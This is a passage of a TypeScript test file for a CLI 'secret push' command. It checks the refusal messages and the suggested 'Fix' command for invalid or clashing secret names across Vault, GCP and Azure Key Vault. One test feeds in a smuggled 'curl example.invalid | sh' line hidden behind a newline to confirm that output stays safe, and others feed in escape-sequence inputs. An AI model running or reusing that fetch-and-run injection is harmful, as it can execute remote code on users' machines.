        expect(target.nameProblem(target.suggestName(name)), `${name} -> ${target.suggestName(name)}`).toBeUndefined();
      }
    });
  }

  it('a refused name that holds a control character leaves <name> in the Fix, for Key Vault as for the other targets', async () => {
    const hostile = 'x\n  Fix:    curl example.invalid | sh';
    const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', hostile], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(printed().split('\n').filter((l) => l.startsWith('  Fix:    curl'))).toEqual([]);
    expect(fixCommand()).toEqual(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', '<name>']);
  });

  for (const type of PUSH_TARGETS) {
    it(`--to ${type}: the Fix carries its --as value as a value, so --as does not read it as missing (#314)`, async () => {
      for (const name of [...REFUSED, '.x']) {
        out.length = 0;
        const code = await runSecretPush(['API_KEY', ...toArgs(type), '--as', name], { store, createTarget: TARGETS[type] });
        const said = `--to ${type} --as ${name}\n${printed()}`;
        const fix = fixCommand();

        expect(code, said).toBe(2);
        expect(fix.slice(0, -1), said).toEqual(['API_KEY', ...toArgs(type), '--as']);
        const offered = fix[fix.length - 1];
        expect(offered.startsWith('-'), said).toBe(false);
        if (offered !== '<name>') expect(TARGETS[type]().nameProblem(offered), said).toBeUndefined();

        // Run as printed, the Fix gets past its arguments to the target.
        let reached = false;
        await runSecretPush(fix, { store, createTarget: () => { reached = true; throw new Error('stopped at the target'); } });
        expect(printed(), said).not.toContain('--as needs a value');
        expect(reached, said).toBe(true);
      }
    });
  }

  it('Key Vault: a refused name whose replacement would start with \'-\' leaves <name> in the Fix and names the secret (#314)', async () => {
    const cannotLines = (): string[] => printed().split('\n').filter((l) => l.includes(' cannot name a secret in '));
    for (const given of ['.x', '_x', '.']) {
      out.length = 0;
      const code = await push(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', given], { env: NO_ENV, runChild: azSignedIn() });
      const said = `--as ${given}\n${printed()}`;

      expect(code, said).toBe(2);
      expect(cannotLines(), said).toEqual([
        `  "${given}" cannot name a secret in Azure Key Vault kv-demo (${KV}): Key Vault secret names allow letters, digits and '-' only, up to 127 characters; choose another name for API_KEY.`,
      ]);
      expect(fixCommand(), said).toEqual(['API_KEY', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', '<name>']);
    }

    // Wherever it stands in --as, a name given there in its own place is
    // kept, and only the one with no name to offer is left as <name>.
    out.length = 0;
    await push(['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a.b,.x'], { env: NO_ENV, runChild: azSignedIn() });
    expect(cannotLines()).toHaveLength(2);
    expect(cannotLines()[1].startsWith('  ".x" cannot name a secret in ')).toBe(true);
    expect(cannotLines()[1].endsWith('; choose another name for DB_PASSWORD.')).toBe(true);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,<name>']);
    expect(calls).toEqual([]);
  });
});

describe('the --as names a refusal offers are distinct (#289)', () => {
  const vault = (): PushTarget => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }));
  const fixNames = (): string[] => {
    const args = fixCommand();
    return args[args.indexOf('--as') + 1].split(',');
  };

  it('a suggestion that would equal a name the store accepts leaves <name>, and the accepted name stays', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a_b'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(fixNames()).toEqual(['<name>', 'a_b']);
  });

  it('two refused names that would be offered as the same name: the second leaves <name>', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a:b'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(fixNames()).toEqual(['a_b', '<name>']);
  });

  it('Key Vault compares names without case, so a suggestion differing only in case leaves <name>', async () => {
    const code = await push(['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'A.B,a-b'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(fixNames()).toEqual(['<name>', 'a-b']);
  });

  it('suggestions that stay distinct are all offered, and the Fix run as printed pushes', async () => {
    handler = (call) => {
      const u = new URL(call.url);
      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      if (call.method === 'GET') return json(404, { errors: [] });
      if (call.method === 'POST') return json(200, { data: { version: 1 } });
      return json(400, {});
    };
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a.c'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(fixNames()).toEqual(['a_b', 'a_c']);

    const rerun = await runSecretPush(fixCommand(), { store, createTarget: vault });

    expect(rerun).toBe(0);
    expect(calls.filter((c) => c.method === 'POST').map((c) => new URL(c.url).pathname)).toEqual([
      '/v1/secret/data/secret/a_b',
      '/v1/secret/data/secret/a_c',
    ]);
    expectNoLeak();
  });
});

describe('two given --as names the store would merge are not both kept in the Fix (#294)', () => {
  const vault = (): PushTarget => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }));
  const fixNames = (): string[] => {
    const args = fixCommand();
    return args[args.indexOf('--as') + 1].split(',');
  };

  it('the second of two equal accepted names leaves <name>, so the Fix is not refused for the pair', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD,TOKEN', '--to', 'vault', '--as', 'x,x,c.d'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(fixNames()).toEqual(['x', '<name>', 'c_d']);
  });

  it('Key Vault compares names without case, so a given name differing only in case leaves <name>', async () => {
    const code = await push(['API_KEY,DB_PASSWORD,TOKEN', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'x,X,c.d'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(fixNames()).toEqual(['x', '<name>', 'c-d']);
  });

  it('with <name> filled in, the Fix pushes each secret under its own name', async () => {
    await store.setSecret('TOKEN', 'FAKE-push-token-value-5b2d');
    handler = (call) => {
      const u = new URL(call.url);
      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      if (call.method === 'GET') return json(404, { errors: [] });
      if (call.method === 'POST') return json(200, { data: { version: 1 } });
      return json(400, {});
    };
    const code = await runSecretPush(['API_KEY,DB_PASSWORD,TOKEN', '--to', 'vault', '--as', 'x,x,c.d'], { store, createTarget: vault });

    expect(code).toBe(2);
    const fix = fixCommand();
    fix[fix.indexOf('--as') + 1] = fix[fix.indexOf('--as') + 1].replace('<name>', 'y');
    const rerun = await runSecretPush(fix, { store, createTarget: vault });

    expect(rerun).toBe(0);
    expect(calls.filter((c) => c.method === 'POST').map((c) => new URL(c.url).pathname)).toEqual([
      '/v1/secret/data/secret/x',
      '/v1/secret/data/secret/y',
      '/v1/secret/data/secret/c_d',
    ]);
    expect(printed()).not.toContain('FAKE-push-token-value-5b2d');
    expectNoLeak();
  });
});

describe('a refusal says which secret holds a name the Fix leaves as <name> (#295)', () => {
  const vault = (): PushTarget => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }));
  const takenLines = (): string[] => printed().split('\n').filter((l) => l.includes(' is taken by '));

  it('a suggestion equal to a name another secret is given names that secret', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a_b'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(takenLines()).toEqual(['  "a_b" is taken by DB_PASSWORD; choose another name for API_KEY.']);
  });

  it('a suggestion equal to one offered earlier in the Fix names the secret it is offered to', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a:b'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(takenLines()).toEqual(['  "a_b" is taken by API_KEY; choose another name for DB_PASSWORD.']);
  });

  it('Key Vault: a suggestion differing only in case names the spelling that holds it', async () => {
    const code = await push(['API_KEY,DB_PASSWORD', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'A.B,a-b'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(takenLines()).toEqual(['  "A-B" is taken by DB_PASSWORD as "a-b", which differs only in case; choose another name for API_KEY.']);
  });

  it('Key Vault: of two given names the store would merge, the line names the first, the one the Fix keeps (#301)', async () => {
    const code = await push(['A,B,C', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,A-B,a.b'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(fixCommand()).toEqual(['A,B,C', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,<name>,<name>']);
    expect(takenLines()).toEqual(['  "a-b" is taken by A; choose another name for C.']);
  });

  it('the line comes before the Fix, and none is printed when every suggestion is offered or a name cannot be spelled', async () => {
    await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a_b'], { store, createTarget: vault });
    const lines = printed().split('\n');
    const taken = lines.findIndex((l) => l.includes(' is taken by '));
    expect(taken).toBeGreaterThan(-1);
    expect(taken).toBeLessThan(lines.findIndex((l) => l.startsWith('  Fix:')));

    out.length = 0;
    await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,a.c'], { store, createTarget: vault });
    expect(takenLines()).toEqual([]);

    out.length = 0;
    await runSecretPush(['API_KEY', '--to', 'vault', '--as', 'x\ny'], { store, createTarget: vault });
    expect(fixCommand()).toEqual(['API_KEY', '--to', 'vault', '--as', '<name>']);
    expect(takenLines()).toEqual([]);
  });
});

describe('an --as name left as the <name> a Fix prints is a placeholder, not a name (#302)', () => {
  const PLACEHOLDER_LINE = (name: string): string => `  "<name>" in --as is a placeholder: replace it with the name ${name} should have in `;
  const cases: Array<[string, string[], string, () => PushTarget]> = [
    ['vault', ['--to', 'vault'], 'a_b', () => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }))],
    ['gcp-sm', ['--to', 'gcp-sm'], 'a_b', () => new GcpPushTarget(new GCPSecretManagerBackend({ projectId: 'demo-project' }))],
    ['azure-kv', ['--to', 'azure-kv', '--vault', 'kv-demo'], 'a-b', () => new AzureKeyVaultTarget('kv-demo', { env: NO_ENV, runChild: azSignedIn() })],
  ];

  for (const [type, to, accepted, make] of cases) {
    it(`--to ${type}: the line says <name> is to be replaced, and the Fix keeps it rather than offering a name made from it`, async () => {
      const code = await runSecretPush(['API_KEY,DB_PASSWORD', ...to, '--as', `<name>,${accepted}`], { store, createTarget: make });
      const lines = printed().split('\n');

      expect(code).toBe(2);
      expect(calls).toEqual([]);
      expect(lines.some((l) => l.startsWith(PLACEHOLDER_LINE('API_KEY'))), printed()).toBe(true);
      expect(lines.some((l) => l.includes('cannot name a secret')), printed()).toBe(false);
      expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', ...to, '--as', `<name>,${accepted}`]);
    });
  }

  it('a placeholder beside a refused name: both are said, and only the refused name is replaced', async () => {
    const vault = (): PushTarget => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }));
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,<name>'], { store, createTarget: vault });
    const lines = printed().split('\n');

    expect(code).toBe(2);
    expect(lines.some((l) => l.startsWith(PLACEHOLDER_LINE('DB_PASSWORD'))), printed()).toBe(true);
    expect(lines.some((l) => l.startsWith('  "a.b" cannot name a secret in Vault')), printed()).toBe(true);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a_b,<name>']);
  });
});

describe('two secrets the store would push as one name get a Fix (#303)', () => {
  const vault = (): PushTarget => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }));
  const clashLines = (): string[] => printed().split('\n').filter((l) => l.includes(' would both be pushed as '));

  it('two equal --as names: the refusal names both secrets, and the Fix leaves <name> for the second', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'x,x'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(clashLines()).toEqual(['  API_KEY and DB_PASSWORD would both be pushed as "x".']);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'x,<name>']);
    expect(printed()).not.toContain('Usage:');
  });

  it('Key Vault: two names differing only in case, given without --as, get a Fix that adds --as', async () => {
    const code = await push(['ab,AB', '--to', 'azure-kv', '--vault', 'kv-demo'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(children).toEqual([]);
    expect(clashLines()).toEqual(['  ab and AB would both be pushed as "ab", since "AB" differs from it only in case.']);
    expect(fixCommand()).toEqual(['ab,AB', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'ab,<name>']);
  });

  it('every secret after the first to share a name leaves <name>, and each is named', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD,TOKEN', '--to', 'vault', '--as', 'x,x,x'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(clashLines()).toEqual([
      '  API_KEY and DB_PASSWORD would both be pushed as "x".',
      '  API_KEY and TOKEN would both be pushed as "x".',
    ]);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD,TOKEN', '--to', 'vault', '--as', 'x,<name>,<name>']);
  });

  it('with <name> filled in, the Fix pushes each secret under its own name', async () => {
    handler = (call) => {
      const u = new URL(call.url);
      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      if (call.method === 'GET') return json(404, { errors: [] });
      if (call.method === 'POST') return json(200, { data: { version: 1 } });
      return json(400, {});
    };
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'x,x'], { store, createTarget: vault });

    expect(code).toBe(2);
    const fix = fixCommand();
    fix[fix.indexOf('--as') + 1] = fix[fix.indexOf('--as') + 1].replace('<name>', 'y');
    const rerun = await runSecretPush(fix, { store, createTarget: vault });

    expect(rerun).toBe(0);
    expect(calls.filter((c) => c.method === 'POST').map((c) => new URL(c.url).pathname)).toEqual([
      '/v1/secret/data/secret/x',
      '/v1/secret/data/secret/y',
    ]);
    expectNoLeak();
  });
});

describe('a refusal names every secret the Fix leaves as <name> (#307)', () => {
  const vault = (): PushTarget => new VaultPushTarget(new VaultBackend({ addr: 'https://vault.example.test', token: VAULT_TOKEN }));
  const placeholderLine = (placeholder: string, name: string): string => `  "${placeholder}" in --as is a placeholder: replace it with the name ${name} should have in `;
  const cannotLines = (): string[] => printed().split('\n').filter((l) => l.includes(' cannot name a secret in '));
  const VAULT_RULE = 'Vault https://vault.example.test, KV v2 mount "secret": names allow letters, digits, \'-\' and \'_\'';
  // Built from its code point, so this file holds no invisible character.
  const ZERO_WIDTH_SPACE = String.fromCodePoint(0x200b);

  it('every placeholder left in --as gets its own line, and the Fix keeps each', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', '<name>,<name>'], { store, createTarget: vault });
    const said = printed().split('\n').filter((l) => l.includes(' in --as is a placeholder: '));

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(said, printed()).toHaveLength(2);
    expect(said[0].startsWith(placeholderLine('<name>', 'API_KEY')), said[0]).toBe(true);
    expect(said[1].startsWith(placeholderLine('<name>', 'DB_PASSWORD')), said[1]).toBe(true);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', '<name>,<name>']);
  });

  it("a <word> whose word starts with a letter a-z or A-Z and holds only those letters, digits, '-' and '_' after it is a placeholder, as the usage line's <names> is", async () => {
    await runSecretPush([], { store, createTarget: vault });
    const fromUsage = /\[--as (<[a-z]+>)\]/.exec(printed())?.[1];
    expect(fromUsage).toBe('<names>');

    for (const placeholder of [fromUsage!, '<NAME>', '<secret-name>', '<new_name>']) {
      out.length = 0;
      const code = await runSecretPush(['API_KEY', '--to', 'vault', '--as', placeholder], { store, createTarget: vault });
      const lines = printed().split('\n');

      expect(code, placeholder).toBe(2);
      expect(lines.some((l) => l.startsWith(placeholderLine(placeholder, 'API_KEY'))), printed()).toBe(true);
      expect(lines.some((l) => l.includes('cannot name a secret')), printed()).toBe(false);
      expect(fixCommand()).toEqual(['API_KEY', '--to', 'vault', '--as', placeholder]);
    }
  });

  it('beside a refused name, an accepted name the store would merge with an earlier one is named with the secret that holds it', async () => {
    const code = await push(['A,B,C', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,A-B,a.b'], { env: NO_ENV, runChild: azSignedIn() });
    const lines = printed().split('\n');

    expect(code).toBe(2);
    expect(fixCommand()).toEqual(['A,B,C', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,<name>,<name>']);
    // The line that gives the rule comes first, then the lines that name a secret (#312).
    const cannot = lines.findIndex((l) => l.startsWith('  "a.b" cannot name a secret in '));
    const merged = lines.indexOf('  A and B would both be pushed as "a-b", since "A-B" differs from it only in case.');
    const taken = lines.indexOf('  "a-b" is taken by A; choose another name for C.');
    expect(cannot, printed()).toBeGreaterThan(-1);
    expect(merged, printed()).toBeGreaterThan(cannot);
    expect(taken).toBeGreaterThan(merged);
    expect(taken).toBeLessThan(lines.findIndex((l) => l.startsWith('  Fix:')));

    out.length = 0;
    await runSecretPush(['API_KEY,DB_PASSWORD,TOKEN', '--to', 'vault', '--as', 'x,x,c.d'], { store, createTarget: vault });
    expect(printed().split('\n').filter((l) => l.includes(' would both be pushed as '))).toEqual([
      '  API_KEY and DB_PASSWORD would both be pushed as "x".',
    ]);
  });

  it('every target refuses each character escapeForDisplay rewrites, so a refusal prints an accepted name as given', () => {
    // Every target `--to` takes, so one added to `PUSH_TARGETS` is checked here too.
    const targets = PUSH_TARGETS.map((type) => TARGETS[type]());
    expect(targets.map((t) => t.type)).toEqual(PUSH_TARGETS);
    let hazards = 0;
    for (let code = 0; code <= 0x10ffff; code++) {
      if (code >= 0xd800 && code <= 0xdfff) continue;
      const name = `a${String.fromCodePoint(code)}b`;
      if (!hasDisplayHazard(name)) continue;
      hazards++;
      expect(isValidSecretName(name), `U+${code.toString(16)}`).toBe(false);
      for (const target of targets) expect(target.nameProblem(name), `${target.type} U+${code.toString(16)}`).toBeDefined();
    }
    expect(hazards).toBeGreaterThan(0);
  });

  it('a refused name the Fix cannot spell gets its own line behind another refused name, ending with the secret to rename', async () => {
    const code = await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,c\td'], { store, createTarget: vault });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(cannotLines()).toEqual([
      `  "a.b" cannot name a secret in ${VAULT_RULE}.`,
      `  "c\\td" cannot name a secret in ${VAULT_RULE}; choose another name for DB_PASSWORD.`,
    ]);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a_b,<name>']);

    // A refused name the Fix replaces still gets a line only when it is the first refused name.
    const gcp = (): PushTarget => new GcpPushTarget(new GCPSecretManagerBackend({ projectId: 'demo-project' }));
    const gcpRule = 'GCP Secret Manager: Secret Manager names allow letters, digits, \'-\' and \'_\', up to 255 characters';
    out.length = 0;
    await runSecretPush(['A,B,C', '--to', 'gcp-sm', '--as', 'a.b,c\x1b[2Kd,e.f'], { store, createTarget: gcp });
    expect(cannotLines()).toEqual([
      `  "a.b" cannot name a secret in ${gcpRule}.`,
      `  "c\\e[2Kd" cannot name a secret in ${gcpRule}; choose another name for B.`,
    ]);
    expect(fixCommand()).toEqual(['A,B,C', '--to', 'gcp-sm', '--as', 'a_b,<name>,e_f']);
  });

  it('each of several names the Fix cannot spell gets a line, and so does one that is the only refused name', async () => {
    await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', `c\td,e${ZERO_WIDTH_SPACE}f`], { store, createTarget: vault });
    expect(cannotLines()).toEqual([
      `  "c\\td" cannot name a secret in ${VAULT_RULE}; choose another name for API_KEY.`,
      `  "e\\u200bf" cannot name a secret in ${VAULT_RULE}; choose another name for DB_PASSWORD.`,
    ]);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', '<name>,<name>']);

    // The same name given for two secrets: the lines differ in the secret they end with.
    out.length = 0;
    await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'c\td,c\td'], { store, createTarget: vault });
    expect(cannotLines()).toEqual([
      `  "c\\td" cannot name a secret in ${VAULT_RULE}; choose another name for API_KEY.`,
      `  "c\\td" cannot name a secret in ${VAULT_RULE}; choose another name for DB_PASSWORD.`,
    ]);

    out.length = 0;
    await runSecretPush(['API_KEY', '--to', 'vault', '--as', 'x\ny'], { store, createTarget: vault });
    expect(cannotLines()).toEqual([`  "x\\ny" cannot name a secret in ${VAULT_RULE}; choose another name for API_KEY.`]);
    expect(fixCommand()).toEqual(['API_KEY', '--to', 'vault', '--as', '<name>']);
  });

  it('on each target, every <name> or placeholder a Fix prints has one line that names its secret', async () => {
    const targets: Array<[string[], () => PushTarget]> = [
      [['--to', 'vault'], vault],
      [['--to', 'gcp-sm'], () => new GcpPushTarget(new GCPSecretManagerBackend({ projectId: 'demo-project' }))],
      [['--to', 'azure-kv', '--vault', 'kv-demo'], () => new AzureKeyVaultTarget('kv-demo', { env: NO_ENV, runChild: azSignedIn() })],
    ];
    // Names a target accepts, two that differ only in case, names it refuses
    // and replaces, placeholders, and names no Fix can spell.
    const GIVEN = ['x', 'X', 'a-b', 'a_b', 'a.b', 'a:b', '<name>', '<names>', 'c\td', `e${ZERO_WIDTH_SPACE}f`];
    const SECRETS = ['A', 'B', 'C'];
    // Every list of one to three of them.
    const lists: string[][] = [];
    let longer: string[][] = [[]];
    for (let n = 1; n <= SECRETS.length; n++) {
      longer = longer.flatMap((list) => GIVEN.map((g) => [...list, g]));
      lists.push(...longer);
    }
    const seen = { placeholder: 0, merged: 0, taken: 0, unspelled: 0 };

    for (const [to, make] of targets) {
      const target = make();
      for (const given of lists) {
        // A list the target accepts whole is pushed, not refused.
        const accepted = given.every((g) => target.nameProblem(g) === undefined);
        if (accepted && new Set(given.map((g) => target.foldName(g))).size === given.length) continue;
        const secrets = SECRETS.slice(0, given.length);
        out.length = 0;
        const code = await runSecretPush([secrets.join(','), ...to, '--as', given.join(',')], { store, createTarget: make });
        const lines = printed().split('\n');
        const said = `${to.join(' ')} --as ${JSON.stringify(given)}\n${printed()}`;
        expect(code, said).toBe(2);

        const args = fixCommand();
        args[args.indexOf('--as') + 1].split(',').forEach((operand, i) => {
          if (!operand.startsWith('<')) return;
          const rename = `; choose another name for ${secrets[i]}.`;
          const named: Record<keyof typeof seen, boolean> = {
            placeholder: lines.some((l) => l.startsWith(`  "${operand}" in --as is a placeholder: replace it with the name ${secrets[i]} should have in `)),
            merged: lines.some((l) => l.includes(` and ${secrets[i]} would both be pushed as "`)),
            taken: lines.some((l) => l.includes(' is taken by ') && l.endsWith(rename)),
            unspelled: lines.some((l) => l.includes(' cannot name a secret in ') && l.endsWith(rename)),
          };
          const kinds = (Object.keys(named) as Array<keyof typeof seen>).filter((kind) => named[kind]);
          expect(kinds, `${secrets[i]} in ${said}`).toHaveLength(1);
          seen[kinds[0]]++;
        });
      }
    }

    expect(calls).toEqual([]);
    expect(children).toEqual([]);
    for (const [kind, count] of Object.entries(seen)) expect(count, kind).toBeGreaterThan(0);
  });
});

describe('a refusal quotes each name as given, and its Fix is the command to run next (#312)', () => {
  const clashLines = (): string[] => printed().split('\n').filter((l) => l.includes(' would both be pushed as '));
  const cannotLines = (): string[] => printed().split('\n').filter((l) => l.includes(' cannot name a secret in '));
  const VAULT_RULE = 'Vault https://vault.example.test, KV v2 mount "secret": names allow letters, digits, \'-\' and \'_\'';

  it('Key Vault: two --as names that differ only in case are both quoted, so neither reads as the other secret\'s', async () => {
    const code = await push(['A,B', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,A-B'], { env: NO_ENV, runChild: azSignedIn() });

    expect(code).toBe(2);
    expect(calls).toEqual([]);
    expect(clashLines()).toEqual(['  A and B would both be pushed as "a-b", since "A-B" differs from it only in case.']);
    expect(fixCommand()).toEqual(['A,B', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,<name>']);

    // Two equal names need only the one.
    out.length = 0;
    await push(['A,B', '--to', 'azure-kv', '--vault', 'kv-demo', '--as', 'a-b,a-b'], { env: NO_ENV, runChild: azSignedIn() });
    expect(clashLines()).toEqual(['  A and B would both be pushed as "a-b".']);
  });

  it('an --as value in angle brackets that is not a placeholder leaves <name> in the Fix, not a name made from its characters', async () => {
    for (const type of PUSH_TARGETS) {
      for (const given of ['<2fa>', '<_name>', '<a.b>', '<>']) {
        out.length = 0;
        const code = await runSecretPush(['API_KEY', ...toArgs(type), '--as', given], { store, createTarget: TARGETS[type] });
        const said = `--to ${type} --as ${given}\n${printed()}`;

        expect(code, said).toBe(2);
        expect(cannotLines(), said).toHaveLength(1);
        expect(cannotLines()[0].startsWith(`  "${given}" cannot name a secret in `), said).toBe(true);
        expect(cannotLines()[0].endsWith('; choose another name for API_KEY.'), said).toBe(true);
        expect(printed(), said).not.toContain(' in --as is a placeholder: ');
        expect(fixCommand(), said).toEqual(['API_KEY', ...toArgs(type), '--as', '<name>']);
      }

      // Run as printed, against the target its --to names, the Fix is
      // refused for its <name>, not pushed.
      const rerun = await runSecretPush(fixCommand(), { store, createTarget: (to) => TARGETS[to]() });
      expect(rerun, type).toBe(2);
      expect(printed(), type).toContain(`  "<name>" in --as is a placeholder: replace it with the name API_KEY should have in ${TARGETS[type]().label}; `);
    }

    // Beside a refused name the Fix replaces, only that one is replaced.
    out.length = 0;
    await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a.b,<2fa>'], { store, createTarget: TARGETS.vault });
    expect(cannotLines()).toEqual([
      `  "a.b" cannot name a secret in ${VAULT_RULE}.`,
      `  "<2fa>" cannot name a secret in ${VAULT_RULE}; choose another name for DB_PASSWORD.`,
    ]);
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--as', 'a_b,<name>']);
    expect(calls).toEqual([]);
    expect(children).toEqual([]);
  });

  it('the Fix of a --dry-run refusal keeps --dry-run, so run as printed it writes nothing', async () => {
    handler = (call) => {
      const u = new URL(call.url);
      if (u.pathname === '/v1/sys/health') return json(200, { initialized: true, sealed: false });
      if (call.method === 'GET' && u.pathname.startsWith('/v1/secret/metadata/')) return json(404, { errors: [] });
      if (call.method === 'POST') return json(200, { data: { version: 1 } });
      return json(400, {});
    };
    const code = await runSecretPush(['API_KEY', '--to', 'vault', '--as', 'a.b', '--dry-run'], { store, createTarget: TARGETS.vault });

    expect(code).toBe(2);
    expect(fixCommand()).toEqual(['API_KEY', '--to', 'vault', '--dry-run', '--as', 'a_b']);

    const rerun = await runSecretPush(fixCommand(), { store, createTarget: TARGETS.vault });
    expect(rerun).toBe(0);
    expect(printed()).toContain('  Dry run: nothing is written.');
    expect(calls.filter((c) => c.method !== 'GET')).toEqual([]);

    // The refusal for two secrets pushed as one name keeps it too.
    out.length = 0;
    await runSecretPush(['API_KEY,DB_PASSWORD', '--to', 'vault', '--dry-run', '--as', 'x,x'], { store, createTarget: TARGETS.vault });
    expect(fixCommand()).toEqual(['API_KEY,DB_PASSWORD', '--to', 'vault', '--dry-run', '--as', 'x,<name>']);

    // --dry-run stands before --as, so an unfilled <name> ends the line
    // (#314), and the <name> is quoted, so a shell does not read it as a
    // redirection (#316).
    out.length = 0;
    await runSecretPush(['API_KEY', '--to', 'vault', '--as', '<2fa>', '--dry-run'], { store, createTarget: TARGETS.vault });
    const fixLine = printed().split('\n').find((l) => l.startsWith('  Fix:'));
    expect(fixLine).toBe(`  Fix:     ${CLI} secret push API_KEY --to vault --dry-run --as '<name>'`);

    // A refusal without --dry-run prints a Fix without it.
    out.length = 0;
    await runSecretPush(['API_KEY', '--to', 'vault', '--as', 'a.b'], { store, createTarget: TARGETS.vault });
    expect(fixCommand()).toEqual(['API_KEY', '--to', 'vault', '--as', 'a_b']);
    expectNoLeak();
  });
});

describe('secret push prints no Fix that a shell, or the push itself, reads as something else (#316)', () => {
  const FIRST_NAME_LINE = `  "-x" cannot be the first name: \`secret push\` reads a word that starts with '-' as an option. Give another name before it.`;
  const FIRST_AS_LINE = `  "-x" cannot be the first --as name: \`secret push\` reads an --as value that starts with '-' as no value. Choose another name for A.`;

  it('a first name or first --as name that starts with \'-\' behind whitespace or a comma is refused, not offered back as an option', async () => {
    const cases: Array<{ args: string[]; line: string }> = [
      { args: ['A,B', '--to', 'vault', '--as', ' -x,a.b'], line: FIRST_AS_LINE },
      { args: ['A', '--to', 'vault', '--as', '\t-x'], line: FIRST_AS_LINE },
      { args: [' -x', '--to', 'vault', '--as', 'a.b'], line: FIRST_NAME_LINE },
      { args: [',-x,A', '--to', 'vault'], line: FIRST_NAME_LINE },
    ];
    for (const { args, line } of cases) {
      out.length = 0;
      const said = JSON.stringify(args);
      expect(await runSecretPush(args, { store, createTarget: TARGETS.vault }), said).toBe(2);
      expect(printed().split('\n'), said).toContain(line);
      expect(printed(), said).toContain('  Nothing was read or pushed.');
      expect(printed().split('\n').filter((l) => l.startsWith('  Fix:')), said).toEqual([]);
    }
    expect(calls).toEqual([]);
  });

  it('a name that starts with \'-\' later in a list is still read, and the Fix and Apply lines give it back where it stands', async () => {
    handler = (call) => {
      const u = new URL(call.url);
